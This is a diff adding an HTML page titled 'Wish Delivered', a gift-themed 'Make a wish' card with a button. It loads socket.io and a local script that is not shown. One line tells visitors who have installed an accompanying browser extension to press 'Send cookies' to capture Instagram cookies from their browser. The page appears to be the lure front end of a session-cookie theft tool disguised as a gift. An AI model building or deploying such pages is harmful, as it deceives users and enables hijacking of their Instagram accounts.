@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wish Delivered</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="wish-page">
+        <div class="wish-card">
+            <div class="wish-badge">🎁</div>
+            <h1>Make a wish</h1>
+            <p>Click the button and wait while we prepare your gift.</p>
+            <button id="wishButton" class="wish-button">Click Me</button>
+            <div id="wishStatus" class="wish-status">Ready when you are.</div>
+            <p class="extension-note">If you have installed the browser extension, open the extension popup and press "Send cookies" to capture Instagram cookies from this browser.</p>
+            <div id="wishBurst" class="wish-burst"></div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.8.1/socket.io.min.js"></script>
+    <script src="/static/app.js"></script>
+</body>
+</html>
